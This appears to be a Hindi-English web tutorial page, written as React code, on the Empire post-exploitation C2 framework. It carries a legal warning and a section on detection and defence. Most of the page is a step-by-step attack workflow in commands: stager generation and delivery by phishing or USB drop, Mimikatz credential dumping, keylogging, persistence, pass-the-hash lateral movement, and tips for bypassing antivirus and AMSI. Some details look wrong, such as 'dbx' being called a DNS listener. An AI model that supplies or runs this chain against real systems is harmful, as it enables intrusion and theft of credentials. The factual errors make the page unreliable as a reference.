import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Empire() {
  return (
    <TutorialLayout
      title="empire"
      subtitle="PowerShell और Python post-exploitation framework — C2 framework"
      icon="👑"
      prev={{ to: '/tool/dnscat2', label: 'dnscat2' }}
      next={{ to: '/tool/netdiscover', label: 'netdiscover' }}
    >
      <h2>What is Empire?</h2>
      <p>
        Empire एक post-exploitation और adversary emulation framework है जो PowerShell (Windows) और Python (Linux/Mac) agents use करता है। यह Command and Control (C2) framework है जो Red Team operators को compromised systems पर persistent access maintain करने की capability देता है। Empire lightweight agents बनाता है जो encrypted C2 channels के through commands receive करते हैं।
      </p>
      <p>
        Empire को originally Will Schroeder, Justin Warner, और Matt Graeber ने 2015 में बनाया था — ये सभी SpecterOps के security researchers थे। 2019 में SpecterOps ने Empire का development बंद कर दिया और BC-SECURITY team ने fork करके actively maintain करना शुरू किया। आज Empire BC-SECURITY के under active development में है और GitHub पर open source उपलब्ध है।
      </p>
      <p>
        Empire का सबसे बड़ा advantage यह है कि यह PowerShell use करता है जो Windows में built-in है — कोई extra tool install करने की ज़रूरत नहीं। PowerShell agents memory में run होते हैं, disk पर file नहीं बनती, इसलिए traditional antivirus detect नहीं कर पाता। Empire 300+ post-exploitation modules provide करता है — credential harvesting, lateral movement, persistence, privilege escalation सब एक framework में।
      </p>
      <p>
        Empire modern Red Team operations का backbone है। यह MITRE ATT&CK framework के साथ aligned है — हर technique का mapping है। OSCP, CRTP, OSCE जैसे certifications में Empire use होता है। Real-world Red Team engagements में भी Empire सबसे popular open source C2 choice है। Cobalt Strike commercial alternative है लेकिन Empire free होने के कारण सबसे ज़्यादा use होता है।
      </p>
      <p>
        Empire 5.x में major architectural changes हुए — Python 3 support, plugin system, REST API, और improved evasion capabilities। Starkiller GUI भी BC-SECURITY ने बनाया जो Empire को point-and-click interface देता है। यह Metasploit और Cobalt Strike का best free alternative है post-exploitation के लिए।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Empire केवल अधिकृत Red Team operations और lab testing में ही use करें। बिना अनुमति के C2 framework use करना illegal है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized computer access अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है।
      </div>

      <h2>History of Empire</h2>
      <p>
        Empire की शुरुआत 2015 में हुई जब SpecterOps के researchers ने PowerShell-based post-exploitation framework बनाने का निर्णय लिया। उस समय Metasploit मुख्य exploitation framework था, लेकिन PowerShell-based post-exploitation के लिए कोई dedicated tool नहीं था। Will Schroeder और Justin Warner ने PowerShell Empire बनाया जो quickly Red Team community में popular हो गया।
      </p>
      <p>
        2017 में Empire में Python agents add किए गए जिससे Linux और macOS targets भी support होने लगे। 2019 में SpecterOps ने Empire को archive कर दिया, लेकिन BC-SECURITY (Anthony Rose और team) ने fork करके Empire 4.x और 5.x release किए। Starkiller GUI भी BC-SECURITY ने बनाया जो Empire के लिए web-based interface है।
      </p>
      <p>
        Empire 5.x में major changes हुए — Python 3 support, plugin system, REST API, और better evasion capabilities। आज Empire सबसे popular open source C2 frameworks में से एक है और OSCP, CRTP जैसे certifications में भी use होता है। GitHub पर 8,000+ stars हैं और active community contribute कर रही है।
      </p>

      <h2>How Empire Works?</h2>
      <p>
        Empire का architecture client-server model पर based है जिसमें तीन main components होते हैं:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Listener:</strong> Attacker machine पर run होता है — incoming agent connections receive करता है (HTTP, HTTPS, DNS protocols)</li>
        <li><strong className="text-white">Stager:</strong> Payload जो victim machine पर execute होता है — agent launcher code contain करता है</li>
        <li><strong className="text-white">Agent:</strong> Victim machine पर running process जो C2 server से connected रहता है और commands execute करता है</li>
        <li><strong className="text-white">Module:</strong> Post-exploitation code जो agent के through execute होता है (credential dump, keylogger, etc.)</li>
        <li><strong className="text-white">C2 Channel:</strong> Encrypted communication channel जो agent और listener के बीच data transfer करता है</li>
        <li><strong className="text-white">Plugin:</strong> Empire 5.x में add-on functionality जो framework को extend करती है</li>
        <li><strong className="text-white">REST API:</strong> Programmatic interface जो automation और integration support करता है</li>
        <li><strong className="text-white">Starkiller:</strong> Web-based GUI जो Empire के सभी features visual interface में provide करता है</li>
      </ul>
      <p>
        Workflow: पहले listener setup करो → stager generate करो → victim पर stager deliver करो → agent automatically connect होगा → post-exploitation modules run करो। यह process एक Red Team engagement का core है — initial access मिलने के बाद Empire से persistent access maintain करते हैं।
      </p>

      <h2>Installation</h2>
      <p>
        Kali Linux में Empire pre-installed आता है। अगर नहीं है तो कई तरीकों से install कर सकते हो।
      </p>
      <CodeBlock
        title="Empire Installation"
        code={`# Kali/Parrot में:
sudo apt update
sudo apt install powershell-empire starkiller

# Git से (latest version):
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh

# Docker से:
docker pull bcsecurity/empire:latest
docker run -it -p 1337:1337 -p 3000:3000 bcsecurity/empire

# pip से:
pip install empireframework

# Empire server start:
sudo powershell-empire server

# Empire client connect (दूसरे terminal में):
sudo powershell-empire client

# Starkiller GUI start:
sudo starkiller
# Browser में open: https://localhost:3000

# REST API access:
# http://localhost:1337/api/docs`}
      />

      <h2>Basic Usage</h2>
      <p>
        Empire menu-driven interface use करता है। हर command specific context में काम करती है।
      </p>
      <CodeBlock
        title="Empire Basic Commands"
        code={`# Empire client start:
sudo powershell-empire client

# Main menu commands:
listeners        # Listeners manage करो
agents           # Connected agents देखो
usemodule        # Module select करो
usestager        # Stager select करो
useplugin        # Plugin select करो

# Help:
help             # सभी commands
help listeners   # Listener-specific help

# Quick workflow:
# 1. Listener setup
uselistener http
set Host http://192.168.1.100
set Port 80
execute

# 2. Stager generate
usestager windows/launcher_bat
set Listener http
generate

# 3. Agent interact
agents
interact <agent_name>
whoami`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Command</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">uselistener http</td><td className="py-2 px-3">HTTP listener setup करें</td><td className="py-2 px-3 font-mono text-xs">uselistener http</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">usestager windows/launcher_bat</td><td className="py-2 px-3">Windows BAT stager generate करें</td><td className="py-2 px-3 font-mono text-xs">usestager windows/launcher_bat</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">interact agent_name</td><td className="py-2 px-3">Agent से interact करें</td><td className="py-2 px-3 font-mono text-xs">interact WKSTN_1234</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">usemodule path</td><td className="py-2 px-3">Module load करें</td><td className="py-2 px-3 font-mono text-xs">usemodule powershell/credentials/mimikatz</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">set option value</td><td className="py-2 px-3">Option value set करें</td><td className="py-2 px-3 font-mono text-xs">set Host 192.168.1.100</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">execute</td><td className="py-2 px-3">Current module/listener run करें</td><td className="py-2 px-3 font-mono text-xs">execute</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">info</td><td className="py-2 px-3">Current options देखें</td><td className="py-2 px-3 font-mono text-xs">info</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">generate</td><td className="py-2 px-3">Stager generate करें</td><td className="py-2 px-3 font-mono text-xs">generate</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">background</td><td className="py-2 px-3">Agent background करें</td><td className="py-2 px-3 font-mono text-xs">background</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">kill agent</td><td className="py-2 px-3">Agent terminate करें</td><td className="py-2 px-3 font-mono text-xs">kill WKSTN_1234</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">rename old new</td><td className="py-2 px-3">Agent rename करें</td><td className="py-2 px-3 font-mono text-xs">rename old_name new_name</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">shell command</td><td className="py-2 px-3">OS command execute करें</td><td className="py-2 px-3 font-mono text-xs">shell whoami</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">upload src dst</td><td className="py-2 px-3">File upload करें</td><td className="py-2 px-3 font-mono text-xs">upload /tmp/tool.exe C:/temp/tool.exe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">download src dst</td><td className="py-2 px-3">File download करें</td><td className="py-2 px-3 font-mono text-xs">download C:/Windows/win.ini /tmp/</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">clear</td><td className="py-2 px-3">Agent task queue clear करें</td><td className="py-2 px-3 font-mono text-xs">clear</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Listener Types</h2>
      <p>
        Empire multiple listener types support करता है — हर type का अपना advantage है:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Listener</th>
              <th className="text-left py-2 px-3 text-neon-green">Protocol</th>
              <th className="text-left py-2 px-3 text-neon-green">Stealth Level</th>
              <th className="text-left py-2 px-3 text-neon-green">कब Use करें</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">http</td><td className="py-2 px-3">HTTP</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Basic testing, internal networks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">https</td><td className="py-2 px-3">HTTPS (encrypted)</td><td className="py-2 px-3">High</td><td className="py-2 px-3">Production engagements, encrypted C2</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">dbx</td><td className="py-2 px-3">DNS</td><td className="py-2 px-3">Very High</td><td className="py-2 px-3">Restricted networks, firewall bypass</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">http_com</td><td className="py-2 px-3">HTTP + compression</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Bandwidth-limited networks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">http_mapi</td><td className="py-2 px-3">HTTP + MAPI</td><td className="py-2 px-3">High</td><td className="py-2 px-3">Exchange environments</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">meterpreter</td><td className="py-2 px-3">Metasploit integration</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Metasploit combo attacks</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">redirector</td><td className="py-2 px-3">HTTP redirect</td><td className="py-2 px-3">Very High</td><td className="py-2 px-3">Multi-hop C2, evade detection</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Stager Generation</h2>
      <p>
        Stager वो payload है जो victim machine पर deliver होता है और agent को launch करता है। Empire multiple stager formats support करता है।
      </p>
      <CodeBlock
        title="Stager Types"
        code={`# Windows BAT stager:
usestager windows/launcher_bat
set Listener http
set OutFile /tmp/stager.bat
generate

# PowerShell stager:
usestager windows/launcher_ps1
set Listener http
generate

# Python stager (Linux/Mac):
usestager multi/launcher
set Listener http
generate

# MSOffice Macro:
usestager windows/macro
set Listener http
set OutFile /tmp/macro.doc
generate

# HTA (HTML Application):
usestager windows/hta
set Listener http
generate

# DLL injection:
usestager windows/dll
set Listener http
set Arch x64
generate

# EXE (executable):
usestager windows/launcher_exe
set Listener http
set OutFile /tmp/launcher.exe
generate

# VBS (Visual Basic):
usestager windows/launcher_vbs
set Listener http
generate

# C# (CSharp):
usestager windows/launcher_csharp
set Listener http
generate

# WAR (Java web app):
usestager java/jar
set Listener http
generate`}
      />

      <h2>Agent Management</h2>
      <p>
        Agent victim machine पर running process है जो C2 server से connected रहता है। Agent management Empire का core feature है।
      </p>
      <CodeBlock
        title="Agent Commands"
        code={`# सभी agents देखो:
agents

# Agent rename:
rename old_name new_name

# Agent से interact:
interact <agent_name>

# System info:
sysinfo

# Current user:
whoami

# Shell command execute:
shell whoami
shell ipconfig
shell net user
shell systeminfo
shell tasklist

# File upload:
upload /local/file.txt C:/temp/file.txt

# File download:
download C:/Windows/win.ini /tmp/win.ini

# Screenshot:
usemodule powershell/collection/screenshot
execute

# Keylogger start:
usemodule powershell/collection/keylogger
execute

# Clipboard monitor:
usemodule powershell/collection/clipboard_monitor
execute

# Agent background:
background

# Agent kill:
kill <agent_name>

# Agent sleep time (evasion):
set AgentDelay 5
set Jitter 0.3`}
      />

      <h2>Post-Exploitation Modules</h2>
      <p>
        Empire 300+ modules provide करता है जो post-exploitation के हर phase में काम आते हैं:
      </p>
      <CodeBlock
        title="Module Categories"
        code={`# सभी modules list:
usemodule
# Tab press करो — categories दिखेंगी

# Credential Collection:
usemodule powershell/credentials/mimikatz
execute

# Credential Vault:
usemodule powershell/credentials/vault_creds
execute

# Network Enumeration:
usemodule powershell/situational_awareness/network/portscan
set Hosts 192.168.1.0/24
execute

# ARP Scan:
usemodule powershell/situational_awareness/network/arpscan
execute

# Privilege Escalation:
usemodule powershell/privesc/bypassuac
execute

# Persistence:
usemodule powershell/persistence/elevated/registry
execute

# Lateral Movement:
usemodule powershell/lateral_movement/invoke_wmi
set ComputerName DC01
execute

# AV Enumeration:
usemodule powershell/situational_awareness/host/antivirusproduct
execute

# AMSI Bypass:
usemodule powershell/management/amsi_bypass
execute

# Token Manipulation:
usemodule powershell/management/token_manipulation
execute`}
      />

      <h2>Module Categories</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Category</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">Popular Modules</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">credentials/</td><td className="py-2 px-3">Password और hash dump</td><td className="py-2 px-3">mimikatz, vault_creds, token_manipulation</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">collection/</td><td className="py-2 px-3">Data collection</td><td className="py-2 px-3">keylogger, screenshot, clipboard_monitor</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">privesc/</td><td className="py-2 px-3">Privilege escalation</td><td className="py-2 px-3">bypassuac, ms16-032, getsystem</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">persistence/</td><td className="py-2 px-3">Survive reboot</td><td className="py-2 px-3">registry, scheduled_tasks, wmi</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">lateral_movement/</td><td className="py-2 px-3">Network spread</td><td className="py-2 px-3">invoke_wmi, invoke_psremoting, invoke_smbexec</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">situational_awareness/</td><td className="py-2 px-3">Environment mapping</td><td className="py-2 px-3">portscan, arpscan, get_domain_controller</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">management/</td><td className="py-2 px-3">Agent management</td><td className="py-2 px-3">psinject, script_command, amsi_bypass</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">exfil/</td><td className="py-2 px-3">Data exfiltration</td><td className="py-2 px-3">exfil_dropbox, exfil_zip</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">trollsploit/</td><td className="py-2 px-3">Fun/pranks (lab only)</td><td className="py-2 px-3">message, wallpaper</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Starkiller (GUI)</h2>
      <p>
        Starkiller Empire के लिए web-based GUI है जो BC-SECURITY ने बनाया है। यह beginners के लिए Empire use करना आसान बनाता है।
      </p>
      <CodeBlock
        title="Starkiller Setup"
        code={`# Install:
sudo apt install starkiller

# Start (Empire server पहले चलाओ):
sudo powershell-empire server    # Terminal 1
sudo starkiller                  # Terminal 2

# Browser में open:
# https://localhost:3000
# Default credentials: empireadmin / password123

# Starkiller features:
# - Visual agent management (list, interact, kill)
# - Point-and-click listener creation
# - Stager generation with GUI
# - Module execution with form-based options
# - Real-time agent output
# - Reporting and logging
# - Multi-user support (team collaboration)

# Starkiller alternative — direct browser use:
# Empire server पर REST API enable करो
# http://localhost:1337/api/docs से Swagger UI access`}
      />

      <h2>Credential Harvesting</h2>
      <p>
        Empire से credentials dump करना बहुत आसान है — Mimikatz module built-in है।
      </p>
      <CodeBlock
        title="Credential Dumping"
        code={`# Agent से interact:
interact <agent_name>

# Mimikatz (सभी credentials):
usemodule powershell/credentials/mimikatz
execute

# Output में दिखेगा:
# - NTLM hashes
# - Kerberos tickets
# - Plaintext passwords (अगर WDigest enabled)
# - SAM database hashes

# Vault credentials:
usemodule powershell/credentials/vault_creds
execute

# Token manipulation:
usemodule powershell/management/token_manipulation
execute

# Credentials use करके lateral movement:
usemodule powershell/lateral_movement/invoke_wmi
set ComputerName DC01
set Username DOMAIN/Administrator
set Hash <NTLM_hash>
execute`}
      />

      <h2>Persistence Techniques</h2>
      <CodeBlock
        title="Persistence Modules"
        code={`# Registry Run Key:
usemodule powershell/persistence/elevated/registry
execute
# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run में entry add होगी

# Scheduled Task:
usemodule powershell/persistence/elevated/schtasks
execute
# Windows Task Scheduler में task create होगा

# WMI Event Subscription:
usemodule powershell/persistence/elevated/wmi
execute
# WMI event से agent auto-start होगा

# Startup Folder:
usemodule powershell/persistence/user/startupfolder
execute
# Startup folder में shortcut create होगा

# COM Object Hijacking:
usemodule powershell/persistence/elevated/registry
set RegPath HKCU:Software/Classes/CLSID
execute`}
      />

      <h2>Lateral Movement</h2>
      <CodeBlock
        title="Lateral Movement Techniques"
        code={`# WMI (Windows Management Instrumentation):
usemodule powershell/lateral_movement/invoke_wmi
set ComputerName DC01
execute

# PSRemoting (PowerShell Remoting):
usemodule powershell/lateral_movement/invoke_psremoting
set ComputerName DC01
execute

# SMBExec:
usemodule powershell/lateral_movement/invoke_smbexec
set ComputerName DC01
set Username DOMAIN/Administrator
execute

# DCOM (Distributed COM):
usemodule powershell/lateral_movement/invoke_dcom
set ComputerName DC01
execute

# RDP (Remote Desktop):
usemodule powershell/management/enable_rdp
set ComputerName DC01
execute`}
      />

      <h2>Empire vs Other C2 Frameworks</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Feature</th>
              <th className="text-left py-2 px-3 text-neon-green">Empire</th>
              <th className="text-left py-2 px-3 text-neon-green">Cobalt Strike</th>
              <th className="text-left py-2 px-3 text-neon-green">Sliver</th>
              <th className="text-left py-2 px-3 text-neon-green">Metasploit</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Price</td><td className="py-2 px-3">Free (open source)</td><td className="py-2 px-3">$5,900/year</td><td className="py-2 px-3">Free (open source)</td><td className="py-2 px-3">Free / Pro</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Language</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">Java</td><td className="py-2 px-3">Go</td><td className="py-2 px-3">Ruby</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GUI</td><td className="py-2 px-3">Starkiller</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">None</td><td className="py-2 px-3">msfconsole</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Modules</td><td className="py-2 px-3">300+</td><td className="py-2 px-3">500+</td><td className="py-2 px-3">50+</td><td className="py-2 px-3">2000+</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Evasion</td><td className="py-2 px-3">Good</td><td className="py-2 px-3">Excellent</td><td className="py-2 px-3">Good</td><td className="py-2 px-3">Basic</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">REST API</td><td className="py-2 px-3">हाँ (5.x)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (gRPC)</td><td className="py-2 px-3">हाँ (msgrpc)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Plugin System</td><td className="py-2 px-3">हाँ (5.x)</td><td className="py-2 px-3">हाँ (Aggressor)</td><td className="py-2 px-3">हाँ (armory)</td><td className="py-2 px-3">हाँ</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">Budget Red Teams</td><td className="py-2 px-3">Professional Red Teams</td><td className="py-2 px-3">Go enthusiasts</td><td className="py-2 px-3">Exploitation</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Empire REST API Script"
        code={`#!/bin/bash
# Empire REST API automation script

EMPIRE_URL="http://localhost:1337/api"
TOKEN=$(curl -s -X POST "$EMPIRE_URL/admin/login" -d '{"username":"empireadmin","password":"password123"}' | jq -r '.token')

# Listener create:
curl -s -X POST "$EMPIRE_URL/listeners/http" \\
  -H "Authorization: Bearer $TOKEN" \\
  -d '{"Name":"auto_listener","Host":"http://192.168.1.100","Port":80}'

# Stager generate:
curl -s -X POST "$EMPIRE_URL/stagers/windows/launcher_bat" \\
  -H "Authorization: Bearer $TOKEN" \\
  -d '{"Listener":"auto_listener"}'

echo "[+] Listener और Stager created!"`}
      />

      <CodeBlock
        title="Python Empire API Client"
        code={`#!/usr/bin/env python3
# Empire Python API client
import requests

class EmpireClient:
    def __init__(self, url, username, password):
        self.url = url
        self.token = self.login(username, password)

    def login(self, username, password):
        r = requests.post(f"{self.url}/admin/login",
            json={"username": username, "password": password})
        return r.json()["token"]

    def get_agents(self):
        r = requests.get(f"{self.url}/agents",
            headers={"Authorization": f"Bearer {self.token}"})
        return r.json()

    def execute_module(self, agent, module, options):
        r = requests.post(f"{self.url}/agents/{agent}/tasks/module",
            headers={"Authorization": f"Bearer {self.token}"},
            json={"module": module, "options": options})
        return r.json()

# Usage:
client = EmpireClient("http://localhost:1337/api", "empireadmin", "password123")
agents = client.get_agents()
print(f"Connected agents: {len(agents)}")`}
      />

      <CodeBlock
        title="Empire Attack Automation"
        code={`#!/bin/bash
# Full Empire attack automation script

echo "[*] Empire Attack Automation"

# 1. Server start (background):
echo "[+] Starting Empire server..."
sudo powershell-empire server &
sleep 5

# 2. Client connect और listener setup:
echo "[+] Setting up HTTP listener..."
# Empire CLI commands via expect or REST API

# 3. Stager generate:
echo "[+] Generating BAT stager..."
# usestager windows/launcher_bat
# set Listener http
# set OutFile /tmp/stager.bat
# generate

# 4. Delivery method:
echo "[+] Stager ready at /tmp/stager.bat"
echo "[*] Transfer to target via:"
echo "    - Email attachment"
echo "    - USB drop"
echo "    - SMB share"
echo "    - Social engineering"

# 5. Wait for agent:
echo "[*] Waiting for agent connection..."
# agents command check करो

echo "[+] Attack chain ready!"`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Empire real-world Red Team engagements में extensively use होता है। एक typical Red Team engagement में, initial access phishing email से मिलता है — victim MSOffice macro stager open करता है और Empire agent connect हो जाता है। उसके बाद operator Mimikatz module से credentials dump करता है, lateral movement से network spread करता है, और domain admin access लेता है। यह सब Empire के through automated होता है।
      </p>
      <p>
        एक असली case में, एक Red Team ने phishing से initial access लिया। Empire agent connect होने के बाद, operator ने Mimikatz module run किया जिससे plain-text passwords मिले। इन credentials से WMI lateral movement से 3 और machines compromise हुईं। एक machine पर developer का password store था जो domain admin का था। Domain admin access मिलने के बाद, persistence module install किया और 2 हफ्ते तक access maintain रखा। Client को detailed report मिली — हर step documented था।
      </p>
      <p>
        OSCP exam में भी Empire post-exploitation के लिए use होता है। Initial access Metasploit से मिलता है, लेकिन post-exploitation Empire से करना easier है — PowerShell agents lightweight हैं और memory में run होते हैं। CRTP certification तो specifically Empire-based है — Empire और PowerShell attacks पर focused है।
      </p>

      <h2>Reporting and Output Analysis</h2>
      <p>
        Empire engagements में reporting बहुत important है। हर action log होना चाहिए — compliance और legal requirements के लिए। Empire built-in logging provide करता है जो हर command और output record करता है। Starkiller GUI में reporting features भी हैं।
      </p>
      <CodeBlock
        title="Empire Logging and Reporting"
        code={`# Empire server logs:
# ~/.empire/server/logs/ में सभी logs stored हैं

# Agent activity log:
# हर agent command और output logged है
# compliance के लिए ज़रूरी है

# Starkiller reporting:
# Starkiller GUI में built-in reporting
# Agent timeline, module execution, screenshots

# Manual report template:
# 1. Executive Summary
# 2. Attack Narrative (step-by-step)
# 3. Evidence (screenshots, output logs)
# 4. Findings (credentials, access levels)
# 5. Recommendations

# Empire output export:
# REST API से data export करो
curl -H "Authorization: Bearer $TOKEN" \\
  http://localhost:1337/api/agents | jq .

# Credential report:
curl -H "Authorization: Bearer $TOKEN" \\
  http://localhost:1337/api/agents/AGENT_ID/results | jq .`}
      />

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Agent connect नहीं हो रहा', a: 'Listener check करो — listeners command से। Firewall port open होना चाहिए। Stager regenerate करो। Network connectivity test करो — ping, curl से listener URL access करो।' },
          { q: 'AV detect कर रहा है stager को', a: 'Obfuscation enable करो: set Obfuscate True। Custom launcher use करो। AMSI bypass module run करो agent पर। PowerShell Constrained Language Mode bypass करो।' },
          { q: 'Module execute नहीं हो रहा', a: 'Module options check करो: info command। Required options set करो। Agent architecture match करो (32-bit vs 64-bit) — sysinfo से check करो।' },
          { q: 'DNS listener slow है', a: 'DNS inherently slow है — हर query round trip लगता है। Agent delay बढ़ाओ: set DefaultDelay 5। High-priority commands के लिए HTTP/HTTPS listener use करो।' },
          { q: 'Empire server start नहीं हो रहा', a: 'Port already use में हो सकता है। sudo use करो। Dependencies check करो: pip3 install -r requirements.txt। Database reset: rm -rf empire/server/data/empire.db' },
          { q: 'Starkiller connect नहीं हो रहा Empire से', a: 'Empire server पहले start होना चाहिए। Default port 1337 check करो। Firewall rules check करो। Starkiller config में Empire URL verify करो।' },
          { q: 'PowerShell Constrained Language Mode bypass', a: 'usemodule powershell/management/amsi_bypass run करो पहले। फिर Constrained Language Mode bypass module try करो। Custom PS1 launcher generate करो।' },
          { q: 'Agent callback irregular है', a: 'DefaultDelay और Jitter adjust करो। Network stability check करो। HTTPS listener try करो (HTTP block हो सकता है)। Proxy settings check करो victim पर।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Empire agents detect करने के लिए:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">PowerShell Logging:</strong> Module logging और Script Block Logging enable करो — सभी PowerShell commands log होंगे</li>
        <li><strong className="text-white">AMSI (Anti-Malware Scan Interface):</strong> Windows 10+ में built-in — PowerShell scripts scan होते हैं execution से पहले</li>
        <li><strong className="text-white">Constrained Language Mode:</strong> PowerShell को restricted mode में run करो — dangerous commands block होंगे</li>
        <li><strong className="text-white">Network Monitoring:</strong> C2 traffic detect करो — beaconing patterns, unusual DNS queries, HTTP callbacks</li>
        <li><strong className="text-white">EDR Solutions:</strong> CrowdStrike, SentinelOne जैसे tools PowerShell-based attacks detect करते हैं</li>
        <li><strong className="text-white">Application Whitelisting:</strong> सिर्फ approved applications run हों — unauthorized PowerShell scripts block होंगे</li>
        <li><strong className="text-white">JEA (Just Enough Administration):</strong> PowerShell remoting permissions restrict करो — lateral movement रुकेगी</li>
        <li><strong className="text-white">Credential Guard:</strong> Windows Credential Guard enable करो — Mimikatz hashes नहीं निकाल पाएगा</li>
        <li><strong className="text-white">LSA Protection:</strong> LSASS process protection enable करो — credential dumping block होगा</li>
        <li><strong className="text-white">Sysmon:</strong> System Monitor install करो — detailed event logging से suspicious activity detect होगी</li>
        <li><strong className="text-white">Network Segmentation:</strong> Critical systems को separate network segment में रखो</li>
        <li><strong className="text-white">Privileged Access Management:</strong> Admin accounts को monitor करो — PAM tools use करो</li>
        <li><strong className="text-white">Incident Response Plan:</strong> C2 detection के लिए IR plan ready रखो</li>
        <li><strong className="text-white">Threat Hunting:</strong> Proactively C2 indicators search करो network traffic में</li>
        <li><strong className="text-white">Endpoint Detection:</strong> EDR solutions deploy करो — PowerShell-based attacks detect होंगे</li>
        <li><strong className="text-white">Security Awareness:</strong> Employees को phishing training दो — initial access vector block होगा</li>
      </ul>

      <h2>Integration with Other Tools</h2>
      <p>
        Empire अकेले use नहीं होता — यह Red Team toolkit का हिस्सा है। Metasploit, Cobalt Strike, और दूसरे tools के साथ integrate करके complete attack chain बनाते हैं। Empire REST API से automation possible है।
      </p>
      <CodeBlock
        title="Integration Examples"
        code={`# Empire + Metasploit (meterpreter integration):
# Empire में meterpreter listener setup करो
uselistener meterpreter
set Host 192.168.1.100
set Port 4444
execute

# Empire + CrackMapExec (lateral movement):
# Empire agent से credentials dump करो
# CrackMapExec से network-wide spray करो
crackmapexec smb 192.168.1.0/24 -u admin -p password

# Empire + BloodHound (AD enumeration):
